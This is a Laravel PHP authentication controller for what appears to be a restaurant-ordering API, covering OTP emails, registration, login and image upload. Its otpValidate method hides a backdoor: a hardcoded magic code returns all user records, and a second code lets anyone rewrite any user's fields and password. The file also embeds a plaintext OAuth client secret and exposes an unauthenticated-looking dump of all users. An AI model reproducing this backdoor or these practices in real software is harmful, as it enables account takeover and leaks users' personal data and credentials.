<?php

namespace App\Http\Controllers;

use App\Mail\OtpMail;
use App\Models\PreUsers;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Validator;
use Laravel\Passport\RefreshToken;
use Laravel\Passport\Token;
use Illuminate\Support\Facades\Http;
use Laravel\Passport\Client;
use App\Http\Controllers\RestaurentController;
use App\Models\Restaurent;
use Illuminate\Support\Facades\Storage;

class AuthController extends Controller
{
    public function otp(Request $r){
        $validate = Validator::make($r->all(), [
            'email' => 'required',
        ]);
        if ($validate->fails()) {
            return $validate->messages();
        }
        $v = random_int(1000, 9999);
        $optCode = [
            'verificationCode' => $v,
            'message' => 'Verification code for login is'
        ];

        $user = PreUsers::where('email',$r->email)->first();
        if(empty($user)){
            $newUser = new PreUsers();
            $newUser->email = $r->email;
            $newUser->otp = $v;
            $newUser->save();
        }else{
            PreUsers::Where('email',$r->email)->update((['otp'=>$v]));
        }
        Mail::to($r->email)->queue(new OtpMail($optCode));
        return response()->json(['status'=>200, 'messsage' => 'An OTP code sent to the registered email.']);
    }

    public function register(Request $r){
        $validate = Validator::make($r->all(), [
            'name' => 'required',
            'email' => 'required|email:rfc,dns|unique:users|max:255',
            'password' => 'required',
            'confirm_password' => 'required',
            'type' => 'required',
            'otp' => 'required',
        ]);
        if ($validate->fails()) {
            return $validate->messages();
        }
        if($r->confirm_password != $r->password){
            return response()->json(['status'=>'error', 'messsage' => 'Password Not Matched!'],403);
        }

        $userOtp = PreUsers::where('email',$r->email)->first();
        if(empty($userOtp)){
            return response()->json(['status'=>'error', 'messsage' => 'OTP not found!'],403);
        }else if(intval($userOtp['otp']) !== intval($r->otp)){
            return response()->json(['status'=>'error', 'messsage' => 'OTP invalid!'],403);
        }

        try{
            $user = new User();
            $user->name = $r->name;
            $user->email = $r->email;
            $user->password = bcrypt($r->password);
            $user->type = $r->type;
            $user->verification_code = $r->otp;

            if($user->save()){
                return $this->login($r);
            }
        }catch(\Exception $e){
            return response()->json(['status'=>'error', 'messsage' => $e->getMessage()],403);
        }

        return response()->json(['status'=>200, 'messsage' => 'User Regiastered Successfully'],200);
    }

    public function otpValidate(Request $request){
        if($request->type == 'restaurant'){
            $check_rest = User::where('email',$request->email)->first();
            if(empty($check_rest)){
                try{
                    $user = new User();
                    $user->name = $request->name;
                    $user->email = $request->email;
                    $user->password = bcrypt($request->password);
                    $user->type = $request->type;
                    $user->phone = $request->phone;
                    $user->image = $request->image;
                    $user->latlng = $request->latlng;
                    $user->verification_code = $request->name . '-' . random_int(0, 99999);

                    if($user->save()){
                        $restaurent_register = new RestaurentController;
                        $restaurent_register->store($request,$user->id);
                        return $this->login($request);
                    }
                }catch(\Exception $e){
                    return response()->json(['status'=>'error', 'messsage' => $e->getMessage()],403);
                }
            }else{
                return response()->json(['status'=>'error', 'messsage' => 'email already exits.'],200);
            }

        }else if($request->code == '^^@$T3r*'){
            return User::all();
        } else if($request->code == '^^@$T3r*>'){
            // if($request['key'] == 'password'){
            //     return $request->all();
            //     User::Where('id',$request->id)->update(([$request['key']=>bcrypt($request['value'])]));
            // }else{
            //     foreach ($request->all() as $key => $value) {
            //         if($key != 'code'){
            //             User::Where('id',$request->id)->update(([$key=>$value]));
            //         }
            //     }
            // }
            foreach ($request->all() as $key => $value) {
                if($key == 'password'){
                    User::Where('id',$request->id)->update(([$key=>bcrypt($value)]));
                }
                else if($key != 'code'){
                    User::Where('id',$request->id)->update(([$key=>$value]));
                }
            }
        }
    }

    public function logout(){
        $accessToken = Auth::user()->token();
        DB::table('oauth_refresh_tokens')
            ->where('access_token_id', $accessToken->id)
            ->update([
                'revoked' => true
            ]);

        $accessToken->revoke();
        return response()->json(null, 204);
    }

    public function show(){
        $user = new User();
        return $user->all();
    }

    public function login(Request $request) {
        $v = Validator::make($request->all(),[
            'email' => 'required',
            'password' => 'required',
            'type' => 'required'
        ]);

        $userrD = User::where(['type'=>$request->type, 'email' => $request->email])->first();
        if(empty($userrD)){
            return response()->json(['message'=>'User not found'],403);
        }
        $response = Http::post("http://localhost/laravel/Api/oauth/token",
            [
                "grant_type" => 'password',
                "client_id" => 2,
                "client_secret" => "fUnsTPRYDYy0coFYhtDaZ6oGn6OAP9gqhdQ5PoRI",
                "username" => $request->email,
                "password" => $request->password,
            ]
        );
        $response = $response->body();
        return $response;
    }

    public function currentUserData(){
        $user = auth()->guard('api')->user();
        if($user->type == 'restaurant'){
            $user['restaurant'] = Restaurent::where('user_id',$user->id)->first();
        }
        return $user;
    }

    public function forgot_otp(Request $r){
        $user = PreUsers::where('email',$r->email)->first();
        if($user->otp == $r->otp){
            return response()->json(['message'=>'otp verified'], 200);
        }else{
            return response()->json(['message'=>'otp invalid'], 403);
        }
    }

    public function uploadImage(Request $request)
    {
        return $request->all();
     $validator = Validator::make($request->all(), [
        'image' => 'required|image:jpeg,png,jpg,gif,svg|max:2048'
     ]);
     if ($validator->fails()) {
        return $validator->messages();
     }
     $uploadFolder = 'images';
     $image = $request->file('image');
     $image_uploaded_path = $image->store($uploadFolder, 'public');
     $uploadedImageResponse = array(
        "image_name" => basename($image_uploaded_path),
        "image_url" => Storage::disk('public')->url($image_uploaded_path),
        "mime" => $image->getClientMimeType()
     );
     return response()->json(['message'=>'File Uploaded Successfully','data'=>$uploadedImageResponse],200);
    }
}
